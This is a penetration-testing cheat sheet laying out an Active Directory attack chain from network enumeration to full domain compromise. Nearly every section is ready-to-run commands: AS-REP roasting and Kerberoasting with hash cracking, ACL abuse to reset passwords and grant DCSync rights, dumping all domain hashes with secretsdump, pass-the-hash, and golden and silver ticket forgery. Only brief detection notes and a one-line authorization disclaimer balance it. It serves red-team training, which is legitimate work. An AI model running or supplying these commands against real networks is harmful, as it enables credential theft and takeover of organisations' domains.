# Active Directory Attack Flow
**Author: Manish Verma**

---

## 📌 Objective
**Scope:** Internal network - Active Directory environments  
**Tools Used:** BloodHound, Impacket, CrackMapExec, Rubeus, Mimikatz  
**Outcome:** Domain Compromise / Domain Admin Access

---

## Phase 1: Enumeration

```bash
# Network discovery
nmap -sn 192.168.1.0/24
crackmapexec smb 192.168.1.0/24

# Domain enumeration
enum4linux -a <DC_IP>
ldapsearch -x -h <DC_IP> -b "dc=domain,dc=com"

# BloodHound collection
bloodhound-python -u user -p password -d domain.local -ns <DC_IP> -c All
```

---

## Phase 2: AS-REP Roasting

```bash
# Find accounts with no preauthentication
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip <DC_IP>

# Crack hash
hashcat -m 18200 hash.txt rockyou.txt
```

### Detection
- Event ID 4768 – Kerberos TGT requested without preauth
- Look for accounts with DONT_REQ_PREAUTH flag

---

## Phase 3: Kerberoasting

```bash
# Request service tickets
GetUserSPNs.py domain.local/user:password -dc-ip <DC_IP> -request

# Crack TGS hash
hashcat -m 13100 tgs_hash.txt rockyou.txt
john --wordlist=rockyou.txt tgs_hash.txt
```

### Detection
- Event ID 4769 – Service ticket requested
- Monitor for unusual SPN requests

---

## Phase 4: BloodHound Analysis

```bash
# Start Neo4j
neo4j start
bloodhound

# Key queries:
# - Shortest path to Domain Admins
# - Find all Kerberoastable users
# - Find ACL abuse paths
# - Find computers where domain users are local admins
```

---

## Phase 5: ACL Abuse

```bash
# GenericAll on user - force password reset
net rpc password "targetuser" "newpass" -U "domain/user%password" -S <DC_IP>

# WriteDACL - grant DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity user -Rights DCSync
```

---

## Phase 6: DCSync

```bash
# Dump all hashes
secretsdump.py domain/user:password@<DC_IP>
secretsdump.py domain/user:password@<DC_IP> -just-dc-ntlm

# Pass-the-Hash
crackmapexec smb <IP_range> -u Administrator -H <NTLM_hash>
psexec.py domain/Administrator@<IP> -hashes :<NTLM_hash>
```

### Detection
- Event ID 4662 – Directory Service access
- Monitor for unusual replication requests from non-DC accounts

---

## Phase 7: Domain Dominance

```bash
# Golden Ticket
ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@<DC_IP>

# Silver Ticket
ticketer.py -nthash <service_hash> -domain-sid <SID> -domain domain.local -spn cifs/<server> user
```

---

## ⚠️ Disclaimer
All techniques for authorized penetration testing only.
